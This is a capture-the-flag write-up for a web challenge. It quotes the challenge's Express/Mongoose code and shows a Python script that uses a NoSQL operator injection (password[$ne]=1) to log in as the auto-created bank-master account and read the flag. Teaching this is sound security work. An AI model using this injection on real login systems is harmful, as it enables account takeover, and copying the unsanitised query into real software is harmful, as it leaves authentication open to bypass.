---
title: "A Very Safe Locker Indeed"
categories: "Web Exploitation"
authors: moha09
tags: 
draft: false
completedDuringEvent: true
submitted: true
points: 270
solves: 46
flags: flag{RANDOM_EACH_INSTANCE?}
---

> We upped our security since last year, and now our lockers are more exclusive than ever! The only thing we couldn't quite work around is the master's authority, can you get yourself a locker and trick him into giving you the secret flag?

---

Given a web application that allows users to register and log in to access their lockers, the registration endpoint code is as follows:

```js
router.post('/register', async (req, res) => {
  const { firstName, lastName, phoneNumber, email, password } = req.body

  // Automatically create a master for the user
  const master = new User({
    firstName,
    lastName: `${lastName}'s Bank Master`,
    phoneNumber,
    email: `${email}.bankmaster`,
    password: process.env.BANK_MASTER_PASSWORD,
    isMaster: true,
  })
  await master.save()

  const user = new User({
    firstName,
    lastName,
    phoneNumber,
    email,
    password,
    isMaster: false,
    masterId: master._id,
  })
  await user.save()

  res.cookie(
    'session',
    { userId: user._id, firstName, lastName, phoneNumber, email },
    { signed: true, httpOnly: true, maxAge: 24 * 60 * 60 * 1000 }
  )

  res.redirect('/')
})
```

The registration endpoint automatically creates a master account for each user with a specific email format. The master account has elevated privileges, including access to a confidential route that returns a flag.

```js
router.get('/master/confedential', async (req, res) => {
  if (!req.user) {
    return res.redirect('/login')
  }

  const userId = req.user.id
  const user = await User.findById(userId)

  if (!user.isMaster) {
    return res.status(403).send('<h2>Unauthorized</h2>')
  }

  res.send(process.env.FLAG)
})
```

The login endpoint is implemented as follows:

```js
router.post('/login', async (req, res) => {
  const { email, password } = req.body

  const user = await User.findOne({ email, password })
  if (!user) {
    return res.render('login', { error: 'Invalid email or password' })
  }

  res.cookie(
    'session',
    {
      userId: user._id,
      firstName: user.firstName,
      lastName: user.lastName,
      phoneNumber: user.phoneNumber,
      email: user.email,
    },
    {
      httpOnly: true,
      signed: true,
      maxAge: 1000 * 60 * 60 * 24,
    }
  )

  res.redirect('/')
})
```

The code passes user-supplied values directly into Mongoose's query: `User.findOne({ email, password })`. If an attacker can send a JSON body (or crafted form fields like `password[$ne]=1`) they can supply MongoDB operators (e.g. `{ "$ne": null }`) and bypass authentication.

To exploit this vulnerability, We can register a new user account with arbitrary details. Then, during the login process, We use the `$ne` (not equal) operator in the password field to bypass the password check for the bankmaster account.

Here is a script that demonstrates how to exploit this vulnerability:

```py
import requests

URL = 'https://{INSTANCE}.chal.ctf.ae'

res = requests.post(f'{URL}/register', data={
    'firstName': 'ztz',
    'lastName': 'ztz',
    'phoneNumber': '1234567890',
    'email': 'ztz@ztz',
    'password': 'ztz'
})
print(res.text)

s = requests.Session()
s.post(f'{URL}/login', data={
    'email': 'ztz@ztz.bankmaster',
    'password[$ne]': '1'
})

res = s.get(f'{URL}/master/confedential')
print(res.text)
```
